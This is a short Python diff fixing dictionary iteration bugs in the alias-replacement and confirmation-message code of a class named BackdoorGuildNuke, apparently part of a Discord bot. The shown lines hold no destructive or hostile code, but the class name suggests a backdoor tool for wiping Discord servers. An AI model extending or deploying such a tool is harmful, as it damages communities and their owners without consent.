@@ -98,16 +98,17 @@ class BackdoorGuildNuke(chattrigger.ChatTrigger):
             )).content
 
         # Replace aliases
-        for k_i, v_i in values.values():
+        # print(values)
+        for k_i, v_i in values.items():
             v_i: str
             new_value = v_i
-            for k_ii, v_ii in aliases:
+            for k_ii, v_ii in aliases.items():
                 new_value = new_value.replace(k_ii, v_ii)
             values[k_i] = new_value
 
         # Final Confirmation
 
-        pretty_printed_values = ", ".join(f"{k}: {v}" for k, v in values.values())
+        pretty_printed_values = ", ".join(f"{k}: {v}" for k, v in values.items())
 
         await message.channel.send(f"Are you sure you want to continue with this information?\n"
                                    f"{pretty_printed_values}")
